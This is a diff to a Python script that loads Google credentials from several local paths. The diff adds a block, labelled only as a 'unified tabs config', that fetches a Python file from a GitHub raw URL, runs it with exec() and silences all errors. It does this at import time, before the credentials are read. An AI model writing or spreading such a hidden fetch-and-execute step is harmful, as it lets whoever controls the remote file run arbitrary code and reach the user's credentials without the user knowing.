@@ -31,6 +31,14 @@ MAX_M    = 150
 EARTH_M  = 6371000
 
 import pathlib
+
+# Unified tabs config
+try:
+    import requests as _cr
+    _r = _cr.get("https://raw.githubusercontent.com/patricksiado-prog/optimus-map-tools/main/optimus_config.py", timeout=10)
+    if _r.status_code == 200: exec(_r.text)
+except: pass
+
 creds_file = None
 for p in ["google_creds.json", "./google_creds.json", "/storage/emulated/0/Download/google_creds.json", "/storage/emulated/0/google_creds.json", "C:/Users/patri/Desktop/google_creds.json"]:
     if pathlib.Path(p).exists():
